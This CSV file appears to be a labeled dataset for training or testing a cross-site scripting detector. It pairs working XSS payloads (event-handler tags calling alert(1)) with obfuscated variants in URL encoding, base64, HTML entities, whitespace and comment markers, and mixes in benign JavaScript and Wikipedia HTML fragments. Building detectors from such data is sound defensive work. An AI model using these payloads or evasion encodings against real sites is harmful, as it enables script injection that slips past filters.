payload_original,payload_obfuscated,label,technique
<discard onpointerover=alert(1)>xss</discard>,%3Cdiscard%20onpointerover%3Dalert%281%29%3Exss%3C%2Fdiscard%3E,1,urlencode
"body: 'when using sass, you can change the color scheme of your site extremely quickly.' }); window.index.add({","body: 'when using sass, you can change the color scheme of your site extremely quickly.' }); window.index.add({",0,none
scrolloffset -= this.dropdownoptions.clientheight / 2; // center in dropdown this.dropdownoptions.scrolltop = scrolloffset; },scrolloffset -= this.dropdownoptions.clientheight / 2; // center in dropdown this.dropdownoptions.scrolltop = scrolloffset; },0,none
"parent.insertbefore(i === 0 ? v : v.clonenode(true), sibling); }); });","parent.insertbefore(i === 0 ? v : v.clonenode(true), sibling); }); });",0,none
<rtc onpointermove=alert(1)>xss</rtc>,<rtc onpointermove=alert(1)>xss</rtc>,1,comment_marker
"'sass/components/_materialbox.scss', 'sass/components/_modal.scss', 'sass/components/_navbar.scss',","'sass/components/_materialbox.scss', 'sass/components/_modal.scss', 'sass/components/_navbar.scss',",0,none
_this72._setupeventhandlers(),_this72._setupeventhandlers(),0,none
"<label draggable=""true"" ondragstart=""alert(1)"">test</label>","<label draggable="" true"" ondragstart=""alert(  1)"">test</label>",1,whitespace_noise
return; } this.ishovered = false;,return; } this.ishovered = false;,0,none
for (const domelement of domelements) { if (domelement !== target) { continue,for (const domelement of domelements) { if (domelement !== target) { continue,0,none
_maybeenablecycle() {,_maybeenablecycle() {,0,none
not: function (selector) { if (!selector) { return this;,not: function (selector) { if (!selector) { return this;,0,none
<q id=x tabindex=1 onbeforedeactivate=alert(1)></q><input autofocus>,&lt;q id=x tabindex=1 onbeforedeactivate=alert(1)&gt;&lt;/q&gt;&lt;input autofocus&gt;,1,html_entities
const tip = this._gettipelement(); tip.classlist.remove(class_name_show); if ('ontouchstart' in document.documentelement) {,const tip = this._gettipelement(); tip.classlist.remove(class_name_show); if ('ontouchstart' in document.documentelement) {,0,none
var dropdownbrect = this.dropdownel.getboundingclientrect(); var idealheight = dropdownbrect.height; var idealwidth = dropdownbrect.width;,var dropdownbrect = this.dropdownel.getboundingclientrect(); var idealheight = dropdownbrect.height; var idealwidth = dropdownbrect.width;,0,none
"<iframe oncopy=""alert(1)"" contenteditable>test</iframe>","<iframe oncopy=""alert(1)"" contenteditable> test</iframe>",1,whitespace_noise
dropdown.getorcreateinstance(this).toggle(); }); definejqueryplugin(dropdown);,dropdown.getorcreateinstance(this).toggle(); }); definejqueryplugin(dropdown);,0,none
"</p><p><a href=""/wiki/transhumanism"" title=""transhumanism"">transhumanism </a> (the merging of humans and machines) is explored in the <a href=""/wiki/manga"" title=""manga"">manga </a> <i><a href=""/wiki/ghost_in_the_shell"" title=""ghost in the shell"">ghost in the shell </a> </i> and the science-fiction series <i><a href=""/wiki/dune_(novel)"" title=""dune (novel)"">dune </a> </i>. in the 1980s, artist <a href=""/wiki/hajime_sorayama"" title=""hajime sorayama"">hajime sorayama </a>'s sexy robots series were painted and published in japan depicting the actual organic human form with lifelike muscular metallic skins and later ""the gynoids"" book followed that was used by or influenced movie makers including <a href=""/wiki/george_lucas"" title=""george lucas"">george lucas </a> and other creatives. sorayama never considered these organic robots to be real part of nature but always unnatural product of the human mind, a fantasy existing in the mind even when realized in actual form.","</p><p><a href=""/wiki/transhumanism"" title=""transhumanism"">transhumanism </a> (the merging of humans and machines) is explored in the <a href=""/wiki/manga"" title=""manga"">manga </a> <i><a href=""/wiki/ghost_in_the_shell"" title=""ghost in the shell"">ghost in the shell </a> </i> and the science-fiction series <i><a href=""/wiki/dune_(novel)"" title=""dune (novel)"">dune </a> </i>. in the 1980s, artist <a href=""/wiki/hajime_sorayama"" title=""hajime sorayama"">hajime sorayama </a>'s sexy robots series were painted and published in japan depicting the actual organic human form with lifelike muscular metallic skins and later ""the gynoids"" book followed that was used by or influenced movie makers including <a href=""/wiki/george_lucas"" title=""george lucas"">george lucas </a> and other creatives. sorayama never considered these organic robots to be real part of nature but always unnatural product of the human mind, a fantasy existing in the mind even when realized in actual form.",0,none
const event_click_data_api = `click${event_key}${data_api_key}`; class button extends basecomponent { static get name() {,const event_click_data_api = `click${event_key}${data_api_key}`; class button extends basecomponent { static get name() {,0,none
"this.$input[0].addeventlistener('focus', this._handleinputfocusbound)","this.$input[0].addeventlistener('focus', this._handleinputfocusbound)",0,none
"<source draggable=""true"" ondragstart=""alert(1)"">test</source>","<source dragga/*OBF*/ble=""tr/*OBF*/ue"" ondragstart=""alert(1)"">test</source>",1,comment_marker
"<style>:target {color: red;}</style><param id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></param>","<  style>:target {color: red;}</style><param id=x style=""transition:color 10s"" ontransitioncancel=alert( 1)><  / param>",1,whitespace_noise
ariaselected = 'true'; } if (opts.hasevent) {,ariaselected = 'true'; } if (opts.hasevent) {,0,none
"<mark onpaste=""alert(1)"" contenteditable>test</mark>",%3Cmark%20onpaste%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fmark%3E,1,urlencode
this._isenabled = false,this._isenabled = false,0,none
this._initializetargetsandobservables(),this._initializetargetsandobservables(),0,none
return } const active = document.queryselector('.bd-aside .active'),return } const active = document.queryselector('.bd-aside .active'),0,none
} _handleclockclickstart(e) { e.preventdefault();,} _handleclockclickstart(e) { e.preventdefault();,0,none
"const order = index > activeindex ? order_next : order_prev; this._slide(order, items[index]); }","const order = index > activeindex ? order_next : order_prev; this._slide(order, items[index]); }",0,none
if (layoutviewport || !layoutviewport && strategy === 'fixed') {,if (layoutviewport || !layoutviewport && strategy === 'fixed') {,0,none
static get name() { return name$2; },static get name() { return name$2; },0,none
if (!object.keys(storeelementevent).length) { return; },if (!object.keys(storeelementevent).length) { return; },0,none
"<xmp draggable=""true"" ondrag=""alert(1)"">test</xmp>","<xmp draggable=""true"" ondrag=""alert(1)"">test</xmp>",1,whitespace_noise
<svg><small onload=alert(1)></small>,PHN2Zz48c21hbGwgb25sb2FkPWFsZXJ0KDEpPjwvc21hbGw+,1,base64
if (oldyearselect) { m.formselect.getinstance(oldyearselect).destroy(); },if (oldyearselect) { m.formselect.getinstance(oldyearselect).destroy(); },0,none
if (typeof config.reference === 'object' && !iselement(config.reference) && typeof config.reference.getboundingclientrect !== 'function') {,if (typeof config.reference === 'object' && !iselement(config.reference) && typeof config.reference.getboundingclientrect !== 'function') {,0,none
"<style>@keyframes x{}</style><ruby style=""animation-name:x"" onanimationend=""alert(1)""></ruby>","<style>@keyframes x{}</style><ruby style=""animation-name:x"" onanimationend=  ""alert(1)""></ruby>",1,whitespace_noise
<picture onblur=alert(1) tabindex=1 id=x></picture><input autofocus>,%3Cpicture%20onblur%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C%2Fpicture%3E%3Cinput%20autofocus%3E,1,urlencode
"key: ""rendertitle"", value: function rendertitle(instance, c, year, month, refyear, randid) { var i = void 0,","key: ""rendertitle"", value: function rendertitle(instance, c, year, month, refyear, randid) { var i = void 0,",0,none
"<abbr onmouseleave=""alert(1)"">test</abbr>","<  abbr onmouseleave=""alert(1)"">test</  abbr>",1,whitespace_noise
"api.addfiles(scssfiles, 'client', { isimport: true }); api.export('m', 'client'); });","api.addfiles(scssfiles, 'client', { isimport: true }); api.export('m', 'client'); });",0,none
<base onpointerdown=alert(1)>xss</base>,<base onpointerdown=alert(1)>xss</base>,1,comment_marker
} this.isopen = true; this.wrapper.classlist.add('open');,} this.isopen = true; this.wrapper.classlist.add('open');,0,none
"<rtc onmouseenter=""alert(1)"">test</rtc>","<rtc onmouseenter=""alert(1)"">te/*OBF*/st</rtc>",1,comment_marker
"addclassfor(scope_target, options.cssclasses.tap, options.animationduration)","addclassfor(scope_target, options.cssclasses.tap, options.animationduration)",0,none
"key: ""_setupeventhandlers"", value: function _setupeventhandlers() { this.el.addeventlistener('keydown', this._handletriggerkeydownbound);","key: ""_setupeventhandlers"", value: function _setupeventhandlers() { this.el.addeventlistener('keydown', this._handletriggerkeydownbound);",0,none
"const link = document.queryselector(`.bd-aside a[href=""${hash}""]`)","const link = document.queryselector(`.bd-aside a[href=""${hash}""]`)",0,none
function hex(x) { return ('0' + parseint(x).tostring(16)).slice(-2); },function hex(x) { return ('0' + parseint(x).tostring(16)).slice(-2); },0,none
"triggertransitionend(transitionelement) } }, emulatedduration)","triggertransitionend(transitionelement) } }, emulatedduration)",0,none
"</span> <span class=""reference-text""><cite class=""citation journal"">chang, hsihui; kao, yi-ching; mashruwala, raj; sorensen, susan m. (10 april 2017). ""technical inefficiency, allocative inefficiency, and audit pricing"". <i>journal of accounting, auditing &amp; finance </i>. <b>33 </b> (4): 580–600. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1177%2f0148558x17696760"">10.1177/0148558x17696760 </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=journal+of+accounting%2c+auditing+%26+finance&amp;rft.atitle=technical+inefficiency%2c+allocative+inefficiency%2c+and+audit+pricing&amp;rft.volume=33&amp;rft.issue=4&amp;rft.pages=580-600&amp;rft.date=2017-04-10&amp;rft_id=info%3adoi%2f10.1177%2f0148558x17696760&amp;rft.aulast=chang&amp;rft.aufirst=hsihui&amp;rft.au=kao%2c+yi-ching&amp;rft.au=mashruwala%2c+raj&amp;rft.au=sorensen%2c+susan+m.&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">","</span> <span class=""reference-text""><cite class=""citation journal"">chang, hsihui; kao, yi-ching; mashruwala, raj; sorensen, susan m. (10 april 2017). ""technical inefficiency, allocative inefficiency, and audit pricing"". <i>journal of accounting, auditing &amp; finance </i>. <b>33 </b> (4): 580–600. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1177%2f0148558x17696760"">10.1177/0148558x17696760 </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=journal+of+accounting%2c+auditing+%26+finance&amp;rft.atitle=technical+inefficiency%2c+allocative+inefficiency%2c+and+audit+pricing&amp;rft.volume=33&amp;rft.issue=4&amp;rft.pages=580-600&amp;rft.date=2017-04-10&amp;rft_id=info%3adoi%2f10.1177%2f0148558x17696760&amp;rft.aulast=chang&amp;rft.aufirst=hsihui&amp;rft.au=kao%2c+yi-ching&amp;rft.au=mashruwala%2c+raj&amp;rft.au=sorensen%2c+susan+m.&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0,none
prev(n) { if (n === undefined || isnan(n)) { n = 1;,prev(n) { if (n === undefined || isnan(n)) { n = 1;,0,none
let $collapsiblelis = $collapsible.children('li'); let isactive = $collapsibleli[0].classlist.contains('active'); let index = $collapsiblelis.index($collapsibleli);,let $collapsiblelis = $collapsible.children('li'); let isactive = $collapsibleli[0].classlist.contains('active'); let index = $collapsiblelis.index($collapsibleli);,0,none
"<style>@keyframes x{}</style><wbr style=""animation-name:x"" onanimationstart=""alert(1)""></wbr>",PHN0eWxlPkBrZXlmcmFtZXMgeHt9PC9zdHlsZT48d2JyIHN0eWxlPSJhbmltYXRpb24tbmFtZTp4IiBvbmFuaW1hdGlvbnN0YXJ0PSJhbGVydCgxKSI+PC93YnI+,1,base64
"}, not: function (selector) { if (!selector) {","}, not: function (selector) { if (!selector) {",0,none
"</span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.channelnewsasia.com/news/commentary/artificial-intelligence-big-data-bias-hiring-loans-key-challenge-11097374"">""commentary: bad news. artificial intelligence is biased"" </a>. <i>cna </i>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=unknown&amp;rft.jtitle=cna&amp;rft.atitle=commentary%3a+bad+news.+artificial+intelligence+is+biased&amp;rft_id=https%3a%2f%2fwww.channelnewsasia.com%2fnews%2fcommentary%2fartificial-intelligence-big-data-bias-hiring-loans-key-challenge-11097374&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">","</span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.channelnewsasia.com/news/commentary/artificial-intelligence-big-data-bias-hiring-loans-key-challenge-11097374"">""commentary: bad news. artificial intelligence is biased"" </a>. <i>cna </i>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=unknown&amp;rft.jtitle=cna&amp;rft.atitle=commentary%3a+bad+news.+artificial+intelligence+is+biased&amp;rft_id=https%3a%2f%2fwww.channelnewsasia.com%2fnews%2fcommentary%2fartificial-intelligence-big-data-bias-hiring-loans-key-challenge-11097374&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0,none
"</span> <span class=""reference-text""><cite class=""citation journal"">neumann, bernd; möller, ralf (january 2008). ""on scene interpretation with description logics"". <i>image and vision computing </i>. <b>26 </b> (1): 82–101. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2fj.imavis.2007.08.013"">10.1016/j.imavis.2007.08.013 </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=image+and+vision+computing&amp;rft.atitle=on+scene+interpretation+with+description+logics&amp;rft.volume=26&amp;rft.issue=1&amp;rft.pages=82-101&amp;rft.date=2008-01&amp;rft_id=info%3adoi%2f10.1016%2fj.imavis.2007.08.013&amp;rft.aulast=neumann&amp;rft.aufirst=bernd&amp;rft.au=m%c3%b6ller%2c+ralf&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">","</span> <span class=""reference-text""><cite class=""citation journal"">neumann, bernd; möller, ralf (january 2008). ""on scene interpretation with description logics"". <i>image and vision computing </i>. <b>26 </b> (1): 82–101. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2fj.imavis.2007.08.013"">10.1016/j.imavis.2007.08.013 </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=image+and+vision+computing&amp;rft.atitle=on+scene+interpretation+with+description+logics&amp;rft.volume=26&amp;rft.issue=1&amp;rft.pages=82-101&amp;rft.date=2008-01&amp;rft_id=info%3adoi%2f10.1016%2fj.imavis.2007.08.013&amp;rft.aulast=neumann&amp;rft.aufirst=bernd&amp;rft.au=m%c3%b6ller%2c+ralf&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0,none
